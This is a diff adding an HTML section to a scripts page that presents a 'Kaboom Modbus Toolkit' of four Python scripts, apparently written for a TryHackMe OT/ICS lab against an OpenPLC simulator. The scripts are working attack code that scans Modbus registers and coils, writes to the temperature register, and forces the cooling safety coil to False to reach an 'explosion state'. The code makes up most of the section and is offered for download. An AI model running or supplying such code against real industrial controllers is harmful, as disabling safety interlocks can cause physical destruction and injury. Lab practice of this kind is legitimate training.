@@ -522,6 +522,194 @@ Dependencies:
 <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Payload sent.&quot;</span><span class="p">)</span>
 </code></pre></div>
 
+<hr>
+
+<h2>Kaboom Modbus Toolkit</h2>
+
+<p>Four-script toolkit for attacking Modbus TCP on OT/ICS systems. Built during the <a href="/kaboom.html">Kaboom</a> TryHackMe lab targeting an OpenPLC CCTV simulator. The scripts map registers and coils, identify the temperature control register, write arbitrary values to spike the process temperature, and force the cooling safety coil to False to achieve explosion state.</p>
+
+<h3>read_temp.py</h3>
+
+<p>Reads a single holding register from a Modbus TCP device and prints the raw value and scaled temperature. Configure HOST, REGISTER, and SCALE before running.</p>
+
+<p>Used in: Kaboom. Download: <a href="/scripts/read_temp.py">read_temp.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">502</span>
+<span class="n">DEVICE_ID</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">REGISTER</span> <span class="o">=</span> <span class="mi">0</span>      <span class="c1"># Replace with the documented temperature register</span>
+<span class="n">SCALE</span> <span class="o">=</span> <span class="mi">10</span>        <span class="c1"># Common: raw 253 means 25.3°C</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">ConnectionError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Could not connect to </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">REGISTER</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">DEVICE_ID</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Modbus error: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">raw</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Raw register value: </span><span class="si">{</span><span class="n">raw</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Temperature: </span><span class="si">{</span><span class="n">raw</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">SCALE</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2"> °C&quot;</span><span class="p">)</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<h3>scan_modbus.py</h3>
+
+<p>Full Modbus register and coil discovery scan. Reads holding registers, input registers, coils, and discrete inputs across address ranges 0-20 and 0-23 respectively. Reports all non-error responses with their values.</p>
+
+<p>Used in: Kaboom. Download: <a href="/scripts/scan_modbus.py">scan_modbus.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">kind</span><span class="p">,</span> <span class="n">reader</span> <span class="ow">in</span> <span class="p">(</span>
+    <span class="p">(</span><span class="s2">&quot;holding&quot;</span><span class="p">,</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">),</span>
+    <span class="p">(</span><span class="s2">&quot;input&quot;</span><span class="p">,</span> <span class="n">client</span><span class="o">.</span><span class="n">read_input_registers</span><span class="p">),</span>
+<span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[</span><span class="si">{</span><span class="n">kind</span><span class="si">}</span><span class="s2"> registers]&quot;</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">21</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">reader</span><span class="p">(</span>
+            <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+            <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+            <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+        <span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[coils]&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[discrete inputs]&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_discrete_inputs</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<h3>test_write.py</h3>
+
+<p>Tests write capability to a Modbus holding register. Reads the current value, writes a new value, then reads again to confirm the change took effect. Used to verify register 0 controls the simulated temperature before escalating to maximum values.</p>
+
+<p>Used in: Kaboom. Download: <a href="/scripts/test_write.py">test_write.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+    <span class="n">before</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Before: </span><span class="si">{</span><span class="n">before</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">write_register</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">value</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Write result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">after</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;After: </span><span class="si">{</span><span class="n">after</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<h3>cooling_obliterato.py</h3>
+
+<p>Forces a Modbus coil to False, disabling the cooling safety mechanism. Reads the coil state before and after to confirm the write. When combined with a maxed-out temperature register, this achieves the explosion state.</p>
+
+<p>Used in: Kaboom. Download: <a href="/scripts/cooling_obliterato.py">cooling_obliterato.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">COOLING_COIL</span> <span class="o">=</span> <span class="mi">15</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+    <span class="n">before</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cooling before: </span><span class="si">{</span><span class="n">before</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">write_coil</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">value</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Write result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">after</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cooling after: </span><span class="si">{</span><span class="n">after</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
   </div>
 
   <footer class="post-footer">
